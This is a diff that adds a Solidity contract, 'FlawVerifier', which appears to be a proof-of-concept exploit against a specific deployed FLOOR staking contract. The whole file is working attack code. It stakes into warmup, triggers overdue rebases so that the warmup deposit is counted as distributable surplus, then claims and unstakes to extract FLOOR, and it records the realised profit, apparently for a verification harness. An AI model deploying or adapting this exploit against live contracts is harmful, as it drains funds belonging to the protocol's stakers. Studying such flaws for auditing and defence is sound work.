@@ -1,0 +1,314 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface IsFLOORLike is IERC20Like {
+    function circulatingSupply() external view returns (uint256);
+    function balanceForGons(uint256 gons) external view returns (uint256);
+}
+
+interface IgFLOORLike is IERC20Like {
+    function balanceFrom(uint256 amount) external view returns (uint256);
+    function balanceTo(uint256 amount) external view returns (uint256);
+}
+
+interface IStakingLike {
+    function FLOOR() external view returns (address);
+    function sFLOOR() external view returns (address);
+    function gFLOOR() external view returns (address);
+
+    function warmupPeriod() external view returns (uint256);
+    function supplyInWarmup() external view returns (uint256);
+    function epoch() external view returns (uint256 length, uint256 number, uint256 end, uint256 distribute);
+    function warmupInfo(address account)
+        external
+        view
+        returns (uint256 deposit, uint256 gons, uint256 expiry, bool lock);
+
+    function stake(address to, uint256 amount, bool rebasing, bool claimNow) external returns (uint256);
+    function claim(address to, bool rebasing) external returns (uint256);
+    function unstake(address to, uint256 amount, bool trigger, bool rebasing) external returns (uint256);
+    function rebase() external returns (uint256);
+}
+
+contract FlawVerifier {
+    struct Claim {
+        uint256 deposit;
+        uint256 gons;
+        uint256 expiry;
+        bool lock;
+    }
+
+    IStakingLike internal constant STAKING =
+        IStakingLike(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539);
+
+    bool private baselineCaptured;
+    uint256 private baselineEquityInFloor;
+    uint256 private realizedProfitInFloor;
+
+    constructor() {}
+
+    function executeOnOpportunity() public {
+        _captureBaseline();
+        _approveSpenders();
+
+        // Path 0: the reported issue only exists when warmupPeriod > 0.
+        uint256 warmupPeriod = STAKING.warmupPeriod();
+        if (!(warmupPeriod > 0)) {
+            _syncProfit();
+            return;
+        }
+
+        // Path 0: the warmup deposit must be redistributed to existing active stakers.
+        uint256 liveStakedSupply = _sFloor().circulatingSupply();
+        if (liveStakedSupply == 0) {
+            _syncProfit();
+            return;
+        }
+
+        _bootstrapFloorBalance();
+
+        uint256 floorToStake = _floor().balanceOf(address(this));
+        if (floorToStake == 0) {
+            _syncProfit();
+            return;
+        }
+
+        // Single-call realization without time cheats only works if enough overdue
+        // epochs already exist to:
+        // 1. let the new warmup deposit be treated as surplus during rebase(), and
+        // 2. advance epoch.number until the warmup position becomes claimable.
+        if (_remainingImmediateRebases() < warmupPeriod + 1) {
+            _syncProfit();
+            return;
+        }
+
+        uint256 warmupSupplyBefore = STAKING.supplyInWarmup();
+
+        // Path 1: stake FLOOR into warmup. On-chain this increments the protocol's
+        // private gonsInWarmup accounting, but that liability is still excluded from
+        // rebase() because rebase() only compares FLOOR balance against
+        // sFLOOR.circulatingSupply().
+        STAKING.stake(address(this), floorToStake, true, false);
+
+        Claim memory info = _warmupInfo();
+        if (info.gons == 0) {
+            _syncProfit();
+            return;
+        }
+
+        uint256 warmupSupplyAfter = STAKING.supplyInWarmup();
+        if (warmupSupplyAfter <= warmupSupplyBefore) {
+            _syncProfit();
+            return;
+        }
+
+        // Path 2: consume all overdue rebases so the warmup-backed FLOOR gets counted
+        // as distributable surplus to current stakers before this verifier claims.
+        _consumeImmediateRebases();
+
+        info = _warmupInfo();
+        if (info.gons == 0) {
+            _syncProfit();
+            return;
+        }
+
+        // Path 3: claim still uses sFLOOR.balanceForGons(info.gons), so the warmup
+        // claim keeps appreciating through rebases even though it was never included
+        // in the liability side of the rebase surplus calculation.
+        uint256 claimableSFloor = _sFloor().balanceForGons(info.gons);
+        if (claimableSFloor == 0) {
+            _syncProfit();
+            return;
+        }
+
+        STAKING.claim(address(this), true);
+        _approveSpenders();
+
+        // Realize as much of the rebased claim as current FLOOR reserves allow. If
+        // insolvency has already formed, optimistic unstakes may revert; the capped
+        // fallback still measures the currently withdrawable profit without cheating.
+        _realizeClaimedSFloor(claimableSFloor);
+        _syncProfit();
+    }
+
+    function profitToken() external view returns (address) {
+        return STAKING.FLOOR();
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return realizedProfitInFloor;
+    }
+
+    function _captureBaseline() internal {
+        if (baselineCaptured) {
+            return;
+        }
+
+        baselineCaptured = true;
+        baselineEquityInFloor = _currentEquityInFloor();
+    }
+
+    function _bootstrapFloorBalance() internal {
+        if (_floor().balanceOf(address(this)) != 0) {
+            return;
+        }
+
+        _redeemVerifierSFloor();
+        if (_floor().balanceOf(address(this)) != 0) {
+            return;
+        }
+
+        _redeemVerifierGFloor();
+    }
+
+    function _redeemVerifierSFloor() internal {
+        uint256 sBalance = _sFloor().balanceOf(address(this));
+        if (sBalance == 0) {
+            return;
+        }
+
+        uint256 reserves = _floor().balanceOf(address(STAKING));
+        uint256 amount = sBalance < reserves ? sBalance : reserves;
+        if (amount == 0) {
+            return;
+        }
+
+        try STAKING.unstake(address(this), amount, _epochReady(), true) returns (uint256) {
+            return;
+        } catch {}
+
+        try STAKING.unstake(address(this), amount, false, true) returns (uint256) {
+            return;
+        } catch {}
+    }
+
+    function _redeemVerifierGFloor() internal {
+        uint256 gBalance = _gFloor().balanceOf(address(this));
+        if (gBalance == 0) {
+            return;
+        }
+
+        uint256 reserves = _floor().balanceOf(address(STAKING));
+        if (reserves == 0) {
+            return;
+        }
+
+        uint256 maxGByReserves = _gFloor().balanceTo(reserves);
+        uint256 amount = gBalance < maxGByReserves ? gBalance : maxGByReserves;
+        if (amount == 0) {
+            return;
+        }
+
+        try STAKING.unstake(address(this), amount, _epochReady(), false) returns (uint256) {
+            return;
+        } catch {}
+
+        try STAKING.unstake(address(this), amount, false, false) returns (uint256) {
+            return;
+        } catch {}
+    }
+
+    function _consumeImmediateRebases() internal {
+        for (uint256 i = 0; i < 64; ++i) {
+            if (!_epochReady()) {
+                break;
+            }
+            STAKING.rebase();
+        }
+    }
+
+    function _realizeClaimedSFloor(uint256 maxAmount) internal {
+        uint256 sBalance = _sFloor().balanceOf(address(this));
+        if (sBalance == 0) {
+            return;
+        }
+
+        uint256 reserves = _floor().balanceOf(address(STAKING));
+        if (reserves == 0) {
+            return;
+        }
+
+        uint256 amount = sBalance;
+        if (amount > maxAmount) {
+            amount = maxAmount;
+        }
+        if (amount > reserves) {
+            amount = reserves;
+        }
+        if (amount == 0) {
+            return;
+        }
+
+        try STAKING.unstake(address(this), amount, _epochReady(), true) returns (uint256) {
+            return;
+        } catch {}
+
+        try STAKING.unstake(address(this), amount, false, true) returns (uint256) {
+            return;
+        } catch {}
+    }
+
+    function _approveSpenders() internal {
+        _floor().approve(address(STAKING), type(uint256).max);
+        _sFloor().approve(address(STAKING), type(uint256).max);
+    }
+
+    function _warmupInfo() internal view returns (Claim memory info) {
+        (info.deposit, info.gons, info.expiry, info.lock) = STAKING.warmupInfo(address(this));
+    }
+
+    function _currentEquityInFloor() internal view returns (uint256 equity) {
+        equity = _floor().balanceOf(address(this));
+        equity += _sFloor().balanceOf(address(this));
+
+        uint256 gBalance = _gFloor().balanceOf(address(this));
+        if (gBalance != 0) {
+            equity += _gFloor().balanceFrom(gBalance);
+        }
+
+        Claim memory info = _warmupInfo();
+        if (info.gons != 0) {
+            equity += _sFloor().balanceForGons(info.gons);
+        }
+    }
+
+    function _remainingImmediateRebases() internal view returns (uint256) {
+        (uint256 length,, uint256 end,) = STAKING.epoch();
+        if (length == 0 || end > block.timestamp) {
+            return 0;
+        }
+
+        return ((block.timestamp - end) / length) + 1;
+    }
+
+    function _epochReady() internal view returns (bool) {
+        (, , uint256 end,) = STAKING.epoch();
+        return end <= block.timestamp;
+    }
+
+    function _floor() internal view returns (IERC20Like) {
+        return IERC20Like(STAKING.FLOOR());
+    }
+
+    function _sFloor() internal view returns (IsFLOORLike) {
+        return IsFLOORLike(STAKING.sFLOOR());
+    }
+
+    function _gFloor() internal view returns (IgFLOORLike) {
+        return IgFLOORLike(STAKING.gFLOOR());
+    }
+
+    function _syncProfit() internal {
+        uint256 currentFloorBalance = _floor().balanceOf(address(this));
+        if (currentFloorBalance > baselineEquityInFloor) {
+            realizedProfitInFloor = currentFloorBalance - baselineEquityInFloor;
+        } else {
+            realizedProfitInFloor = 0;
+        }
+    }
+}
